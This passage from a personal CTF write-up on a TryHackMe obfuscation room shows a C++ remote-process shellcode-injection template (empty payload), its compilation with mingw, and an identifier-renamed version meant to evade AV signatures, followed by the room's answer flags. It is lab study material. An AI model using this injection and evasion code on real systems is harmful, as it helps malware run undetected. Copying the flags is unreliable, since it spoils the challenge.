@@ -398,3 +398,204 @@ Note: the file name must be challenge-8.exe to receive the flag.
 #include <iostream>
 #include <string>
 using namespace std;
+
+int main(int argc, char* argv[])
+{
+	unsigned char shellcode[] = "";
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	string leaked = "This was leaked in the strings";
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	cout << "Handle obtained for" << processHandle;
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	cout << "Buffer Created";
+	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
+	cout << "Process written with buffer" << remoteBuffer;
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+	cout << "Closing handle" << processHandle;
+	cout << leaked;
+
+	return 0;
+}
+```
+What flag is found after uploading a properly obfuscated snippet?
+To build the source, use x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ nano challenge-8.cpp
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
+x86_64-w64-mingw32-g++: command not found
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ i686-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
+i686-w64-mingw32-g++: command not found
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ apt install g++-mingw-w64-i686                      
+E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ sudo apt install g++-mingw-w64-i686                    
+[sudo] password for kali: 
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following additional packages will be installed:
+  binutils-mingw-w64-i686 g++-mingw-w64-i686-posix g++-mingw-w64-i686-win32
+  gcc-mingw-w64-base gcc-mingw-w64-i686-posix gcc-mingw-w64-i686-posix-runtime
+  gcc-mingw-w64-i686-win32 gcc-mingw-w64-i686-win32-runtime mingw-w64-common
+  mingw-w64-i686-dev
+Suggested packages:
+  gcc-10-locales wine
+The following NEW packages will be installed:
+  binutils-mingw-w64-i686 g++-mingw-w64-i686 g++-mingw-w64-i686-posix
+  g++-mingw-w64-i686-win32 gcc-mingw-w64-base gcc-mingw-w64-i686-posix
+  gcc-mingw-w64-i686-posix-runtime gcc-mingw-w64-i686-win32
+  gcc-mingw-w64-i686-win32-runtime mingw-w64-common mingw-w64-i686-dev
+0 upgraded, 11 newly installed, 0 to remove and 731 not upgraded.
+Need to get 106 MB of archives.
+After this operation, 567 MB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Get:1 http://http.kali.org/kali kali-rolling/main amd64 binutils-mingw-w64-i686 amd64 2.37-7+9 [2,527 kB]
+Get:2 http://kali.download/kali kali-rolling/main amd64 mingw-w64-common all 10.0.0-2 [5,173 kB]
+Get:3 http://kali.download/kali kali-rolling/main amd64 mingw-w64-i686-dev all 10.0.0-2 [2,810 kB]
+Get:4 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-base amd64 10.3.0-15+24.4 [187 kB]
+Get:5 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-posix-runtime amd64 10.3.0-15+24.4 [10.7 MB]
+Get:6 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-posix amd64 10.3.0-15+24.4 [26.3 MB]
+Get:7 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686-posix amd64 10.3.0-15+24.4 [10.5 MB]
+Get:8 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-win32-runtime amd64 10.3.0-15+24.4 [10.7 MB]
+Get:9 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-win32 amd64 10.3.0-15+24.4 [26.3 MB]
+Get:10 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686-win32 amd64 10.3.0-15+24.4 [10.5 MB]
+Get:11 http://http.kali.org/kali kali-rolling/main amd64 g++-mingw-w64-i686 all 10.3.0-15+24.4 [186 kB]
+Fetched 106 MB in 8s (13.7 MB/s)                                                          
+Selecting previously unselected package binutils-mingw-w64-i686.
+(Reading database ... 309085 files and directories currently installed.)
+Preparing to unpack .../00-binutils-mingw-w64-i686_2.37-7+9_amd64.deb ...
+Unpacking binutils-mingw-w64-i686 (2.37-7+9) ...
+Selecting previously unselected package mingw-w64-common.
+Preparing to unpack .../01-mingw-w64-common_10.0.0-2_all.deb ...
+Unpacking mingw-w64-common (10.0.0-2) ...
+Selecting previously unselected package mingw-w64-i686-dev.
+Preparing to unpack .../02-mingw-w64-i686-dev_10.0.0-2_all.deb ...
+Unpacking mingw-w64-i686-dev (10.0.0-2) ...
+Selecting previously unselected package gcc-mingw-w64-base:amd64.
+Preparing to unpack .../03-gcc-mingw-w64-base_10.3.0-15+24.4_amd64.deb ...
+Unpacking gcc-mingw-w64-base:amd64 (10.3.0-15+24.4) ...
+Selecting previously unselected package gcc-mingw-w64-i686-posix-runtime.
+Preparing to unpack .../04-gcc-mingw-w64-i686-posix-runtime_10.3.0-15+24.4_amd64.deb ...
+Unpacking gcc-mingw-w64-i686-posix-runtime (10.3.0-15+24.4) ...
+Selecting previously unselected package gcc-mingw-w64-i686-posix.
+Preparing to unpack .../05-gcc-mingw-w64-i686-posix_10.3.0-15+24.4_amd64.deb ...
+Unpacking gcc-mingw-w64-i686-posix (10.3.0-15+24.4) ...
+Selecting previously unselected package g++-mingw-w64-i686-posix.
+Preparing to unpack .../06-g++-mingw-w64-i686-posix_10.3.0-15+24.4_amd64.deb ...
+Unpacking g++-mingw-w64-i686-posix (10.3.0-15+24.4) ...
+Selecting previously unselected package gcc-mingw-w64-i686-win32-runtime.
+Preparing to unpack .../07-gcc-mingw-w64-i686-win32-runtime_10.3.0-15+24.4_amd64.deb ...
+Unpacking gcc-mingw-w64-i686-win32-runtime (10.3.0-15+24.4) ...
+Selecting previously unselected package gcc-mingw-w64-i686-win32.
+Preparing to unpack .../08-gcc-mingw-w64-i686-win32_10.3.0-15+24.4_amd64.deb ...
+Unpacking gcc-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
+Selecting previously unselected package g++-mingw-w64-i686-win32.
+Preparing to unpack .../09-g++-mingw-w64-i686-win32_10.3.0-15+24.4_amd64.deb ...
+Unpacking g++-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
+Selecting previously unselected package g++-mingw-w64-i686.
+Preparing to unpack .../10-g++-mingw-w64-i686_10.3.0-15+24.4_all.deb ...
+Unpacking g++-mingw-w64-i686 (10.3.0-15+24.4) ...
+Setting up gcc-mingw-w64-base:amd64 (10.3.0-15+24.4) ...
+Setting up gcc-mingw-w64-i686-posix-runtime (10.3.0-15+24.4) ...
+Setting up binutils-mingw-w64-i686 (2.37-7+9) ...
+Setting up gcc-mingw-w64-i686-win32-runtime (10.3.0-15+24.4) ...
+Setting up mingw-w64-common (10.0.0-2) ...
+Setting up mingw-w64-i686-dev (10.0.0-2) ...
+Setting up gcc-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
+update-alternatives: using /usr/bin/i686-w64-mingw32-gcc-win32 to provide /usr/bin/i686-w64-mingw32-gcc (i686-w64-mingw32-gcc) in auto mode
+Setting up g++-mingw-w64-i686-win32 (10.3.0-15+24.4) ...
+update-alternatives: using /usr/bin/i686-w64-mingw32-g++-win32 to provide /usr/bin/i686-w64-mingw32-g++ (i686-w64-mingw32-g++) in auto mode
+Setting up gcc-mingw-w64-i686-posix (10.3.0-15+24.4) ...
+Setting up g++-mingw-w64-i686-posix (10.3.0-15+24.4) ...
+Setting up g++-mingw-w64-i686 (10.3.0-15+24.4) ...
+Processing triggers for man-db (2.10.2-1) ...
+Processing triggers for kali-menu (2022.3.1) ...
+Scanning processes...                                                                      
+Scanning processor microcode...                                                            
+Scanning linux images...                                                                   
+
+Running kernel seems to be up-to-date.
+
+The processor microcode seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+
+No VM guests are running outdated hypervisor (qemu) binaries on this host.
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ i686-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ ls
+challenge-8.cpp  challenge-8.exe  flag1.ps
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ cat challenge-8.cpp 
+#include "windows.h"
+
+int main(int argc, char* argv[])
+{
+        unsigned char awoler[] = "";
+
+        HANDLE awerfu;
+        HANDLE rwfhbf;
+        PVOID iauwef;
+
+        awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+        iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
+        rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
+        CloseHandle(awerfu);
+
+        return 0;
+}
+```
+![[Pasted image 20220916210810.png]]
+### Conclusion
+Obfuscation can be one of the most lucrative tools in an attackers arsenal when it comes to evasion. Both attackers and defenders alike should understand and assess not only its uses but also its impacts.
+In this room, we covered the principles of obfuscation as it relates to both signature evasion and anti reverse-engineering.
+The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.
+At this point, you can take obfuscation a step further into signature evasion where it is directly applied to signatures or use it at a higher-level with obfuscators.
+Read the above and continue learning!
+
+## Flags / Answers
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3dd905a363f9b95560b5d0f7dc250ac5.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/42fdab7091783f27a58c26c7b82ec09a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/246ac1239f25ea18b52459ad9de5610c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/10577cd43a7c96046b9c69764cf3b575.png)
+- ***THM{koNC473n473_4Ll_7H3_7H1n95}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/180c008b9c27d83650181d0703586302.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/80e480508a64290f424a4409d2270799.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png)
+- ***THM{D3cod3d!!}***
+- ***THM{Y0Ur_1NF0_15_M1N3}***
+
+## Notes / Lessons Learned
+[[AV Evasion Shellcode]]
+
